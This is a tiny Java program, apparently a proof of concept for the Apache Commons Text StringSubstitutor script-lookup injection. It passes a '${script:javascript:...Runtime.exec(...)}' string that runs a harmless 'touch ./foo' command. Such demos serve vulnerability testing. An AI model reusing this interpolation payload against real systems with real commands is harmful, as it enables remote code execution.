package com.endor;
import org.apache.commons.text.StringSubstitutor;

public class stringsub {
    public static void main(String... args) {
        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch ./foo')}");
        System.out.println(out);
    }    
}
